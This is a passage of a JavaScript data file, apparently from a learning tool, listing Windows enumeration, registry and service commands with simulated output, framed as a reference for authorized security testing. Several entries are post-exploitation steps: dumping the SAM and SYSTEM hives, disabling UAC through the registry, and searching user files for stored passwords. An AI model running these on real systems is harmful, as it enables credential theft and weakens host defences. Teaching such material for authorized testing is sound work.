// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
// Comprehensive security command reference for authorized testing only.

const WINDOWS_COMMANDS = [
  // ============================================================
  // ENUMERATION (30 commands)
  // ============================================================
  {
    cmd: 'systeminfo',
    desc: 'Display detailed configuration information about the computer and its operating system',
    examples: [
      { usage: 'systeminfo', output: 'Host Name:                 WORKSTATION01\nOS Name:                   Microsoft Windows 10 Pro\nOS Version:                10.0.19045 N/A Build 19045\nSystem Manufacturer:       Dell Inc.\nSystem Model:              OptiPlex 7090\nSystem Type:               x64-based PC\nTotal Physical Memory:     16,384 MB\nAvailable Physical Memory: 8,192 MB\nDomain:                    CORP.local\nLogon Server:              \\\\DC01' },
      { usage: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"', output: 'OS Name:                   Microsoft Windows 10 Pro\nOS Version:                10.0.19045 N/A Build 19045' },
      { usage: 'systeminfo /s DC01 /u CORP\\admin /p Password1', output: 'Host Name:                 DC01\nOS Name:                   Microsoft Windows Server 2022 Standard\nOS Version:                10.0.20348 N/A Build 20348\nDomain:                    CORP.local' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'hostname',
    desc: 'Display the hostname of the current machine',
    examples: [
      { usage: 'hostname', output: 'WORKSTATION01' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'ver',
    desc: 'Display the Windows version number',
    examples: [
      { usage: 'ver', output: 'Microsoft Windows [Version 10.0.19045.3803]' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'wmic os get Caption,Version,BuildNumber,OSArchitecture',
    desc: 'Query operating system details via WMI command line',
    examples: [
      { usage: 'wmic os get Caption,Version,BuildNumber,OSArchitecture', output: 'BuildNumber  Caption                          OSArchitecture  Version\n19045        Microsoft Windows 10 Pro         64-bit          10.0.19045' },
      { usage: 'wmic os get LastBootUpTime', output: 'LastBootUpTime\n20240115083022.500000-360' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'wmic bios get Manufacturer,SMBIOSBIOSVersion,SerialNumber',
    desc: 'Query BIOS information including manufacturer and serial number',
    examples: [
      { usage: 'wmic bios get Manufacturer,SMBIOSBIOSVersion,SerialNumber', output: 'Manufacturer  SMBIOSBIOSVersion  SerialNumber\nDell Inc.     2.18.0             ABCD1234567' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors',
    desc: 'Query CPU details including core count',
    examples: [
      { usage: 'wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors', output: 'Name                                     NumberOfCores  NumberOfLogicalProcessors\nIntel(R) Core(TM) i7-10700 CPU @ 2.90GHz 8              16' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem,DriveType',
    desc: 'Enumerate logical disks with size and filesystem information',
    examples: [
      { usage: 'wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem,DriveType', output: 'DeviceID  DriveType  FileSystem  FreeSpace       Size\nC:        3          NTFS        107374182400    256060514304\nD:        3          NTFS        450971566080    500105249792\nE:        5' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'fsutil volume diskfree C:',
    desc: 'Display disk space information for a volume',
    examples: [
      { usage: 'fsutil volume diskfree C:', output: 'Total # of free bytes        : 107374182400\nTotal # of bytes             : 256060514304\nTotal # of avail free bytes  : 107374182400' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'bcdedit /enum',
    desc: 'Display boot configuration data entries',
    examples: [
      { usage: 'bcdedit /enum', output: 'Windows Boot Manager\n--------------------\nidentifier              {bootmgr}\ndevice                  partition=\\Device\\HarddiskVolume1\ndescription             Windows Boot Manager\nlocale                  en-US\n\nWindows Boot Loader\n-------------------\nidentifier              {current}\ndevice                  partition=C:\nosdevice                partition=C:\npath                    \\Windows\\system32\\winload.efi\ndescription             Windows 10' },
      { usage: 'bcdedit /enum {current}', output: 'Windows Boot Loader\n-------------------\nidentifier              {current}\ndevice                  partition=C:\npath                    \\Windows\\system32\\winload.efi\ndescription             Windows 10\nrecoveryenabled         Yes\ntestsigning             No' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'driverquery',
    desc: 'List all installed device drivers and their properties',
    examples: [
      { usage: 'driverquery /v /fo csv', output: '"Module Name","Display Name","Driver Type","Link Date","Start Mode","State","Status","Accept Stop","Accept Pause","Paged Pool(bytes)","Code(bytes)","BSS(bytes)","Init(bytes)","Path"\n"1394ohci","1394 OHCI Compliant Host Controller","Kernel","6/21/2006 5:20:00 PM","Manual","Stopped","OK","FALSE","FALSE","0","0","0","0","C:\\Windows\\system32\\drivers\\1394ohci.sys"' },
      { usage: 'driverquery /si', output: 'DeviceName             InfName        IsSigned  Manufacturer\n=====================  =============  ========  ================\nMicrosoft ISATAP Adapt  nettun.inf     TRUE      Microsoft\nRealtek PCIe GbE Fami  rt640x64.inf   TRUE      Realtek' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'tasklist',
    desc: 'Display a list of all currently running processes',
    examples: [
      { usage: 'tasklist /svc', output: 'Image Name                     PID Services\n========================= ======== ============================================\nSystem Idle Process              0 N/A\nSystem                           4 N/A\nsmss.exe                       348 N/A\ncsrss.exe                      472 N/A\nsvchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power\nsvchost.exe                    876 RpcEptMapper, RpcSs\nlsass.exe                      660 KeyIso, SamSs, VaultSvc' },
      { usage: 'tasklist /fi "imagename eq svchost.exe" /fo csv', output: '"Image Name","PID","Session Name","Session#","Mem Usage"\n"svchost.exe","804","Services","0","25,600 K"\n"svchost.exe","876","Services","0","12,288 K"\n"svchost.exe","1024","Services","0","18,432 K"' },
      { usage: 'tasklist /m ntdll.dll', output: 'Image Name                     PID Modules\n========================= ======== ============================================\nSystem                           4 ntdll.dll\nsmss.exe                       348 ntdll.dll\ncsrss.exe                      472 ntdll.dll\nwinlogon.exe                   564 ntdll.dll' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'taskkill',
    desc: 'Terminate tasks by process ID or image name',
    examples: [
      { usage: 'taskkill /pid 1234 /f', output: 'SUCCESS: The process with PID 1234 has been terminated.' },
      { usage: 'taskkill /im notepad.exe /f', output: 'SUCCESS: The process "notepad.exe" with PID 5678 has been terminated.' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'set',
    desc: 'Display all current environment variables',
    examples: [
      { usage: 'set', output: 'ALLUSERSPROFILE=C:\\ProgramData\nAPPDATA=C:\\Users\\admin\\AppData\\Roaming\nCOMPUTERNAME=WORKSTATION01\nComSpec=C:\\Windows\\system32\\cmd.exe\nHOMEDRIVE=C:\nHOMEPATH=\\Users\\admin\nLOGONSERVER=\\\\DC01\nOS=Windows_NT\nPATH=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem\nPROCESSOR_ARCHITECTURE=AMD64\nSystemRoot=C:\\Windows\nUSERDOMAIN=CORP\nUSERNAME=admin\nUSERPROFILE=C:\\Users\\admin' },
      { usage: 'set PROCESSOR', output: 'PROCESSOR_ARCHITECTURE=AMD64\nPROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 3, GenuineIntel\nPROCESSOR_LEVEL=6\nPROCESSOR_REVISION=a503\nNUMBER_OF_PROCESSORS=16' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'path',
    desc: 'Display or set the command search path',
    examples: [
      { usage: 'path', output: 'PATH=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;C:\\Program Files\\Git\\cmd;C:\\Python311' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'dir',
    desc: 'List directory contents with file attributes',
    examples: [
      { usage: 'dir /a /q C:\\Users', output: ' Volume in drive C has no label.\n Directory of C:\\Users\n\n01/15/2024  08:30 AM    <DIR>          NT AUTHORITY\\SYSTEM  .\n01/15/2024  08:30 AM    <DIR>          NT AUTHORITY\\SYSTEM  ..\n01/15/2024  08:30 AM    <DIR>          CORP\\admin           admin\n07/10/2023  09:15 AM    <DIR>          NT AUTHORITY\\SYSTEM  Default\n07/10/2023  09:15 AM    <DIR>          NT AUTHORITY\\SYSTEM  Public' },
      { usage: 'dir /s /b C:\\Users\\admin\\*.txt', output: 'C:\\Users\\admin\\Desktop\\notes.txt\nC:\\Users\\admin\\Documents\\passwords.txt\nC:\\Users\\admin\\AppData\\Local\\Temp\\output.txt' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'tree',
    desc: 'Display directory structure in a tree format',
    examples: [
      { usage: 'tree /f /a C:\\inetpub', output: 'C:\\INETPUB\n|   \n+---adminscripts\n+---custerr\n|   +---en-US\n+---history\n+---logs\n|   +---LogFiles\n+---temp\n+---wwwroot\n|       iisstart.htm\n|       iisstart.png' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'type',
    desc: 'Display the contents of a text file',
    examples: [
      { usage: 'type C:\\Windows\\System32\\drivers\\etc\\hosts', output: '# Copyright (c) 1993-2009 Microsoft Corp.\n#\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n#\n# localhost name resolution is handled within DNS itself.\n#\t127.0.0.1       localhost\n#\t::1             localhost\n\n192.168.1.100   intranet.corp.local\n192.168.1.200   fileserver.corp.local' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'findstr',
    desc: 'Search for text patterns in files using regular expressions',
    examples: [
      { usage: 'findstr /si "password" C:\\Users\\admin\\*.txt C:\\Users\\admin\\*.xml C:\\Users\\admin\\*.ini', output: 'C:\\Users\\admin\\Documents\\config.ini:password=Summer2024!\nC:\\Users\\admin\\Desktop\\notes.txt:WiFi password: Corp@Wifi99' },
      { usage: 'findstr /spin /c:"net user" C:\\Windows\\System32\\*.bat', output: 'C:\\Windows\\System32\\scripts\\setup.bat:15:net user svcaccount P@ssw0rd /add' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'where',
    desc: 'Locate and display the file path for a given program',
    examples: [
      { usage: 'where python', output: 'C:\\Python311\\python.exe\nC:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python311\\python.exe' },
      { usage: 'where /r C:\\Windows *.exe | findstr -i "cmd"', output: 'C:\\Windows\\System32\\cmd.exe\nC:\\Windows\\SysWOW64\\cmd.exe' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'whoami /all',
    desc: 'Display current user identity, SID, group memberships, and privileges',
    examples: [
      { usage: 'whoami /all', output: 'USER INFORMATION\n----------------\nUser Name       SID\n=============== =============================================\ncorp\\admin      S-1-5-21-3623811015-3361044348-30300820-1013\n\nGROUP INFORMATION\n-----------------\nGroup Name                           Type             SID                          Attributes\n==================================== ================ ============================ ==================================================\nCORP\\Domain Admins                   Group            S-1-5-21-3623811015-...1512  Mandatory group, Enabled by default\nBUILTIN\\Administrators               Alias            S-1-5-32-544                 Mandatory group, Enabled by default, Group owner\nNT AUTHORITY\\INTERACTIVE             Well-known group S-1-5-4                      Mandatory group, Enabled by default\n\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeDebugPrivilege              Debug programs                 Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeImpersonatePrivilege        Impersonate a client           Enabled' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'wmic baseboard get Manufacturer,Product,SerialNumber',
    desc: 'Query motherboard hardware details',
    examples: [
      { usage: 'wmic baseboard get Manufacturer,Product,SerialNumber', output: 'Manufacturer     Product           SerialNumber\nDell Inc.        0KWVT8            /ABCDEF/CN1234567/GHIJ/' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'wmic memorychip get Capacity,Speed,Manufacturer',
    desc: 'Query physical memory module details',
    examples: [
      { usage: 'wmic memorychip get Capacity,Speed,Manufacturer', output: 'Capacity      Manufacturer  Speed\n8589934592    Samsung       3200\n8589934592    Samsung       3200' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'Get-ComputerInfo',
    desc: 'PowerShell cmdlet to retrieve comprehensive system information',
    examples: [
      { usage: 'Get-ComputerInfo | Select-Object CsName,WindowsVersion,OsArchitecture,CsProcessors', output: 'CsName         : WORKSTATION01\nWindowsVersion : 2009\nOsArchitecture : 64-bit\nCsProcessors   : {Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz}' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'Get-PSDrive',
    desc: 'List all PowerShell drives including filesystem, registry, and certificate stores',
    examples: [
      { usage: 'Get-PSDrive -PSProvider FileSystem', output: 'Name  Used (GB)  Free (GB)  Provider    Root\n----  ---------  ---------  --------    ----\nC        138.42      99.98  FileSystem  C:\\\nD        45.72     374.28   FileSystem  D:\\' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'Get-HotFix',
    desc: 'List installed Windows updates and hotfixes',
    examples: [
      { usage: 'Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5', output: 'Source        Description   HotFixID   InstalledBy          InstalledOn\n------        -----------   --------   -----------          -----------\nWORKSTATION01 Update        KB5034441  NT AUTHORITY\\SYSTEM  1/12/2024\nWORKSTATION01 Security Upd  KB5034122  NT AUTHORITY\\SYSTEM  1/9/2024\nWORKSTATION01 Update        KB5032392  NT AUTHORITY\\SYSTEM  12/15/2023\nWORKSTATION01 Security Upd  KB5031356  NT AUTHORITY\\SYSTEM  11/14/2023\nWORKSTATION01 Update        KB5030841  NT AUTHORITY\\SYSTEM  10/10/2023' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'msinfo32 /report C:\\temp\\sysinfo.txt',
    desc: 'Generate a detailed system information report to a text file',
    examples: [
      { usage: 'msinfo32 /report C:\\temp\\sysinfo.txt', output: '[System Information report generated at C:\\temp\\sysinfo.txt]' },
      { usage: 'msinfo32 /categories +SystemSummary /report C:\\temp\\summary.txt', output: '[System Summary report generated at C:\\temp\\summary.txt]' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'Get-Process',
    desc: 'List running processes with detailed information',
    examples: [
      { usage: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name,Id,CPU,WorkingSet', output: 'Name         Id    CPU(s) WorkingSet\n----         --    ------ ----------\nchrome     3412  1245.67  524288000\nMsMpEng    1804   456.12  209715200\nsvchost    1024   234.89  104857600\nexplorer   4520   123.45   83886080\ncode       6780    98.23  314572800' },
      { usage: 'Get-Process -Name lsass | Format-List *', output: 'Name                       : lsass\nId                         : 660\nPriorityClass              : Normal\nFileVersion                : 10.0.19041.3803\nPath                       : C:\\Windows\\System32\\lsass.exe\nCompany                    : Microsoft Corporation\nCPU                        : 45.328125\nProductVersion             : 10.0.19041.3803\nStartTime                  : 1/15/2024 8:30:15 AM\nThreads                    : {688, 692, 696, 700...}' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"',
    desc: 'Query Windows version details from the registry via PowerShell',
    examples: [
      { usage: 'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" | Select-Object ProductName,CurrentBuild,UBR,ReleaseId', output: 'ProductName  : Windows 10 Pro\nCurrentBuild : 19045\nUBR          : 3803\nReleaseId    : 2009' }
    ],
    category: 'enumeration'
  },
  {
    cmd: 'wmic environment list brief',
    desc: 'List system and user environment variables via WMI',
    examples: [
      { usage: 'wmic environment list brief', output: 'Name                    UserName               VariableValue\nComSpec                 <SYSTEM>               C:\\Windows\\system32\\cmd.exe\nOS                      <SYSTEM>               Windows_NT\nPath                    <SYSTEM>               C:\\Windows\\system32;C:\\Windows\nPROCESSOR_ARCHITECTURE  <SYSTEM>               AMD64\nTEMP                    CORP\\admin              C:\\Users\\admin\\AppData\\Local\\Temp' }
    ],
    category: 'enumeration'
  },
  {
    cmd: '[System.Environment]::Is64BitOperatingSystem',
    desc: 'PowerShell check for 64-bit operating system',
    examples: [
      { usage: '[System.Environment]::Is64BitOperatingSystem', output: 'True' },
      { usage: '[System.Environment]::OSVersion | Format-List', output: 'Platform      : Win32NT\nServicePack   :\nVersion       : 10.0.19045.0\nVersionString : Microsoft Windows NT 10.0.19045.0' }
    ],
    category: 'enumeration'
  },

  // ============================================================
  // REGISTRY (22 commands)
  // ============================================================
  {
    cmd: 'reg query',
    desc: 'Query the registry for keys and values',
    examples: [
      { usage: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', output: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    VMware User Process    REG_SZ    "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr\n    RealTek    REG_SZ    C:\\Program Files\\Realtek\\Audio\\HDA\\RAVCpl64.exe' },
      { usage: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce', output: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n    WExtract    REG_SZ    C:\\Users\\admin\\AppData\\Local\\Temp\\IXP000.TMP\\runonce.cmd' },
      { usage: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', output: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    Shell    REG_SZ    explorer.exe\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,\n    DefaultUserName    REG_SZ    admin\n    AutoAdminLogon    REG_SZ    0\n    LastUsedUsername    REG_SZ    admin' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services',
    desc: 'Enumerate all registered Windows services in the registry',
    examples: [
      { usage: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services /s /f "ImagePath" /d | findstr /i "ImagePath"', output: '    ImagePath    REG_EXPAND_SZ    C:\\Windows\\system32\\svchost.exe -k netsvcs\n    ImagePath    REG_EXPAND_SZ    C:\\Windows\\system32\\lsass.exe\n    ImagePath    REG_EXPAND_SZ    C:\\Windows\\system32\\spoolsv.exe\n    ImagePath    REG_SZ    C:\\suspicious\\backdoor.exe' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg add',
    desc: 'Add a new registry key or value',
    examples: [
      { usage: 'reg add HKCU\\SOFTWARE\\TestKey /v TestValue /t REG_SZ /d "hello" /f', output: 'The operation completed successfully.' },
      { usage: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg delete',
    desc: 'Delete a registry key or value',
    examples: [
      { usage: 'reg delete HKCU\\SOFTWARE\\TestKey /v TestValue /f', output: 'The operation completed successfully.' },
      { usage: 'reg delete HKCU\\SOFTWARE\\TestKey /f', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg export',
    desc: 'Export registry keys and values to a .reg file',
    examples: [
      { usage: 'reg export HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run C:\\temp\\run_keys.reg', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg import',
    desc: 'Import registry entries from a .reg file',
    examples: [
      { usage: 'reg import C:\\temp\\run_keys.reg', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg save',
    desc: 'Save a registry hive to a binary file',
    examples: [
      { usage: 'reg save HKLM\\SAM C:\\temp\\sam.hiv', output: 'The operation completed successfully.' },
      { usage: 'reg save HKLM\\SYSTEM C:\\temp\\system.hiv', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg restore',
    desc: 'Restore a registry hive from a saved binary file',
    examples: [
      { usage: 'reg restore HKLM\\SAM C:\\temp\\sam.hiv', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg compare',
    desc: 'Compare two registry keys or values',
    examples: [
      { usage: 'reg compare HKLM\\SOFTWARE\\Test1 HKLM\\SOFTWARE\\Test2 /v Setting', output: 'Value: HKLM\\SOFTWARE\\Test1\\Setting\n    REG_SZ    ValueA\nValue: HKLM\\SOFTWARE\\Test2\\Setting\n    REG_SZ    ValueB\n\nResult Compared:  Different' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg copy',
    desc: 'Copy registry keys from one location to another',
    examples: [
      { usage: 'reg copy HKLM\\SOFTWARE\\TestKey HKLM\\SOFTWARE\\TestKey_Backup /s /f', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg load',
    desc: 'Load a registry hive file into a temporary key',
    examples: [
      { usage: 'reg load HKLM\\TEMP_HIVE C:\\temp\\ntuser.dat', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg unload',
    desc: 'Unload a previously loaded registry hive',
    examples: [
      { usage: 'reg unload HKLM\\TEMP_HIVE', output: 'The operation completed successfully.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName',
    desc: 'List all installed software from the registry uninstall keys',
    examples: [
      { usage: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName | findstr /i "DisplayName"', output: '    DisplayName    REG_SZ    Microsoft Visual C++ 2019 X64 Redistributable\n    DisplayName    REG_SZ    Google Chrome\n    DisplayName    REG_SZ    7-Zip 23.01 (x64)\n    DisplayName    REG_SZ    Python 3.11.7 (64-bit)\n    DisplayName    REG_SZ    Git' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"',
    desc: 'Check Windows Defender policy configuration in the registry',
    examples: [
      { usage: 'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /s', output: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\n    DisableAntiSpyware    REG_DWORD    0x0\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\n    DisableRealtimeMonitoring    REG_DWORD    0x0\n    DisableBehaviorMonitoring    REG_DWORD    0x0' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query HKLM\\SAM\\SAM /s',
    desc: 'Attempt to read the SAM database from the registry (requires SYSTEM)',
    examples: [
      { usage: 'reg query HKLM\\SAM\\SAM /s', output: 'ERROR: Access is denied.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"',
    desc: 'Query Local Security Authority configuration',
    examples: [
      { usage: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"', output: 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n    Security Packages    REG_MULTI_SZ    kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\n    LimitBlankPasswordUse    REG_DWORD    0x1\n    RunAsPPL    REG_DWORD    0x1\n    DisableRestrictedAdmin    REG_DWORD    0x0' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s',
    desc: 'Check for Image File Execution Options debugger hijacking',
    examples: [
      { usage: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /v Debugger', output: 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\n    Debugger    REG_SZ    C:\\Windows\\System32\\cmd.exe\n\nEnd of search: 1 match(es) found.' }
    ],
    category: 'registry'
  },
  {
    cmd: 'Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
    desc: 'PowerShell query of autostart Run key entries',
    examples: [
      { usage: 'Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', output: 'SecurityHealth : C:\\Windows\\system32\\SecurityHealthSystray.exe\nVMwareUserProcess : "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr\nPSPath        : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nPSParentPath  : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion' }
    ],
    category: 'registry'
  },
  {
    cmd: 'Get-ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
    desc: 'PowerShell enumeration of Run key subkeys',
    examples: [
      { usage: 'Get-ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.ValueCount -gt 0 } | Select-Object -First 10 Name', output: 'Name\n----\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"',
    desc: 'Check WDigest authentication settings for credential caching',
    examples: [
      { usage: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"', output: 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n    UseLogonCredential    REG_DWORD    0x0\n    Negotiate    REG_DWORD    0x0' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"',
    desc: 'Check Remote Desktop Protocol (RDP) configuration',
    examples: [
      { usage: 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections', output: 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\n    fDenyTSConnections    REG_DWORD    0x0' }
    ],
    category: 'registry'
  },
  {
    cmd: 'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU',
    desc: 'Query the Run dialog history from the registry',
    examples: [
      { usage: 'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU', output: 'HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\n    a    REG_SZ    cmd\\1\n    b    REG_SZ    powershell\\1\n    c    REG_SZ    regedit\\1\n    MRUList    REG_SZ    cba' }
    ],
    category: 'registry'
  },

  // ============================================================
  // SERVICES (22 commands)
  // ============================================================
  {
    cmd: 'sc query',
    desc: 'Query the status of a service or list all services',
    examples: [
      { usage: 'sc query type= service state= all', output: 'SERVICE_NAME: AeLookupSvc\nDISPLAY_NAME: Application Experience\n        TYPE               : 30  WIN32\n        STATE              : 1  STOPPED\n\nSERVICE_NAME: WinDefend\nDISPLAY_NAME: Microsoft Defender Antivirus Service\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)' },
      { usage: 'sc query WinDefend', output: 'SERVICE_NAME: WinDefend\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc qc',
    desc: 'Query the configuration of a service',
    examples: [
      { usage: 'sc qc WinDefend', output: '[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: WinDefend\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.23110.3-0\\MsMpEng.exe"\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Microsoft Defender Antivirus Service\n        DEPENDENCIES       : RpcSs\n        SERVICE_START_NAME : LocalSystem' },
